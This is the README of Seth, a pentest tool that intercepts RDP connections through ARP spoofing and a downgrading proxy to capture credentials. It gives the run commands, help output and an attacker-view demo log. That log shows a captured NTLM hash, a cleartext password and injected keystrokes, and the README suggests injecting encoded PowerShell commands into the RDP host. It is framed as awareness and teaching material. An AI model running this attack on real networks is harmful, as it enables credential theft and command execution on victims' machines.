Seth
====

Seth is a tool written in Python and Bash to MitM RDP connections by
attempting to downgrade the connection in order to extract clear text
credentials. It was developed to raise awareness and educate about the
importance of properly configured RDP connections in the context of
pentests, workshops or talks. The author is Adrian Vollmer (SySS GmbH).

Usage
-----

Run it like this:

    $ ./seth.sh <INTERFACE> <ATTACKER IP> <VICTIM IP> <GATEWAY IP|HOST IP> [<COMMAND>]

Unless the RDP host is on the same subnet as the victim machine, the last IP
address must be that of the gateway.

The last parameter is optional. It can contain a command that is executed on
the RDP host by simulating WIN+R via key press event injection. Keystroke
injection depends on which keyboard layout the victim is using - currently
it's only reliable with the English US layout. I suggest avoiding special
characters by using `powershell -enc <STRING>`, where STRING is your
UTF-16le and Base64 encoded command.  However, `calc` should be pretty
universal and gets the job done.

The shell script performs ARP spoofing to gain a Man-in-the-Middle position
and redirects the traffic such that it runs through an RDP proxy. The proxy
can be called separately. This can be useful if you want use Seth in
combination with Responder. Use Responder to gain a Man-in-the-Middle
position and run Seth at the same time. Run `seth.py -h` for more
information:

    usage: seth.py [-h] [-d] [-f] [-p LISTEN_PORT] [-b BIND_IP] [-g {0,1,3,11}]
                   [-j INJECT] -c CERTFILE -k KEYFILE
                   target_host [target_port]

    RDP credential sniffer -- Adrian Vollmer, SySS GmbH 2017

    positional arguments:
      target_host           target host of the RDP service
      target_port           TCP port of the target RDP service (default 3389)

    optional arguments:
      -h, --help            show this help message and exit
      -d, --debug           show debug information
      -f, --fake-server     perform a 'fake server' attack
      -p LISTEN_PORT, --listen-port LISTEN_PORT
                            TCP port to listen on (default 3389)
      -b BIND_IP, --bind-ip BIND_IP
                            IP address to bind the fake service to (default all)
      -g {0,1,3,11}, --downgrade {0,1,3,11}
                            downgrade the authentication protocol to this (default
                            3)
      -j INJECT, --inject INJECT
                            command to execute via key press event injection
      -c CERTFILE, --certfile CERTFILE
                            path to the certificate file
      -k KEYFILE, --keyfile KEYFILE
                            path to the key file

For more information read the PDF in `doc/paper` (or read the code!). The
paper also contains recommendations for counter measures.

You can also watch a twenty minute presentation including a demo (starting
at 14:00) on Youtube: https://www.youtube.com/watch?v=wdPkY7gykf4

Or watch just the demo (with subtitles) here:
https://www.youtube.com/watch?v=JvvxTNrKV-s

Demo
----

The following ouput shows the attacker's view. Seth sniffs an offline
crackable hash as well as the clear text password. Here, NLA is not enforced
and the victim ignored the certificate warning.

![Seth](https://github.com/SySS-Research/Seth/blob/master/doc/img/seth-logo.png)

    # ./seth.sh eth1 192.168.57.{103,2,102}
    ███████╗███████╗████████╗██╗  ██╗
    ██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
    ███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
    ╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017
    ███████║███████╗   ██║   ██║  ██║   https://www.syss.de
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
    [*] Spoofing arp replies...
    [*] Turning on IP forwarding...
    [*] Set iptables rules for SYN packets...
    [*] Waiting for a SYN packet to the original destination...
    [+] Got it! Original destination is 192.168.57.102
    [*] Clone the x509 certificate of the original destination...
    [*] Adjust the iptables rule for all packets...
    [*] Run RDP proxy...
    Listening for new connection
    Connection received from 192.168.57.103:50431
    Downgrading authentication options from 11 to 3
    Enable SSL
    alice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000
    Tamper with NTLM response
    TLS alert access denied, Downgrading CredSSP
    Connection lost
    Connection received from 192.168.57.103:50409
    Listening for new connection
    Enable SSL
    Connection lost
    Connection received from 192.168.57.103:50410
    Listening for new connection
    Enable SSL
    Hiding forged protocol request from client
    .\alice:ilovebob
    Keyboard Layout: 0x409 (English_United_States)
    Key press:   LShift
    Key press:   S
    Key release:                 S
    Key release:                 LShift
    Key press:   E
    Key release:                 E
    Key press:   C
    Key release:                 C
    Key press:   R
    Key release:                 R
    Key press:   E
    Key release:                 E
    Key press:   T
    Key release:                 T
    Connection lost
    [*] Cleaning up...
    [*] Done.

Requirements
------------

* `python3`
* `tcpdump`
* `arpspoof`

  `arpspoof` is part of `dsniff`
* `openssl`


Disclaimer
----------

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.
